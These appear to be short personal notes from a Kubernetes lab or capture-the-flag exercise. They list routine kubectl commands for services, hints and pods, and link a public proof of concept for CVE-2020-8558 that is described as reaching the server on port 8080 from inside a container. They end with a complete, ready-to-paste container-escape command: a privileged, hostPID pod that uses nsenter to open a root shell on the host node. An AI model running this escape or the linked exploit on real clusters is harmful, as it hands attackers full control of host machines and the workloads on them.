# commands
```text-plain
kubectl get service	## kubectl get service kubernetes -o yaml
```

```text-plain
k get hints | jq '.items[].spec.message'
```

[https://github.com/tabbysable/POC-2020-8558](https://github.com/tabbysable/POC-2020-8558) 

this exploit allows us to communicate with the server(8080) when we are already in a container

```text-plain
k run <name> --image <pod_image> -it --rm  bash --image-pull-policy=IfNotPresent
```

```text-plain
k describe pod <name>
k delete pod <name>
```

kubernetes Container escape:

```text-plain
kubectl run r00t --restart=Never -it --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```